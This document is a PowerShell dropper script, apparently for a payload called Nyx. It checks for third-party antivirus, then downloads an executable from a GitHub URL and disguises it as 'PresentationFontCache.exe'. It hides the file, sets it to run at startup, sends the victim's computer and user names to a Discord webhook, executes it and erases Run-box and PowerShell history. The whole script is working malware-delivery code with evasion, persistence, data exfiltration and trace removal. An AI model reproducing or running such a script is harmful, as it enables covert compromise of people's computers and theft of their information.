# Nyx - DH79TXV5

$Antivirus = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntivirusProduct

if ($Antivirus -and $Antivirus.displayName -ne "Windows Defender") {
# Set webhook URL
$WebhookUrl = "https://discord.com/api/webhooks/1076454751140597841/4kStnAeJdVLHb6Dc99czhwSi23Kwnzvbz7pxydOPiFeyvK4MSPibTO9-TlTLoJkrj1iY"

# Set message content
$Message = "**DH79TXV5  |  ComputerName: $env:COMPUTERNAME  |  UserName: $env:USERNAME**`nHas been found unknown antivirus product: $($Antivirus.displayName)`nNyx installation cancelled!"

# Build JSON object with message data
$Json = @{
    "content" = $Message
}

# Convert JSON object to string
$JsonString = $Json | ConvertTo-Json -Depth 2

# Send message to webhook
Invoke-RestMethod -Method Post -Uri $WebhookUrl -Body $JsonString -ContentType 'application/json'

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
} else {
# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/DH79TXV5/Nyx.exe -OutFile "$env:TEMP\Nyx.exe"

# Change Nyx Name
Rename-Item -Path "$env:TEMP\Nyx.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:TEMP\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "Nyx" `
-Value "$env:TEMP\PresentationFontCache.exe"

# Set webhook URL
$WebhookUrl = "https://discord.com/api/webhooks/1076454751140597841/4kStnAeJdVLHb6Dc99czhwSi23Kwnzvbz7pxydOPiFeyvK4MSPibTO9-TlTLoJkrj1iY"

# Set message content
$Message = "**DH79TXV5  |  ComputerName: $env:COMPUTERNAME  |  UserName: $env:USERNAME**`nNyx installation completed!"

# Build JSON object with message data
$Json = @{
    "content" = $Message
}

# Convert JSON object to string
$JsonString = $Json | ConvertTo-Json -Depth 2

# Send message to webhook
Invoke-RestMethod -Method Post -Uri $WebhookUrl -Body $JsonString -ContentType 'application/json'

# Run Nyx
& "$env:TEMP\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
} 
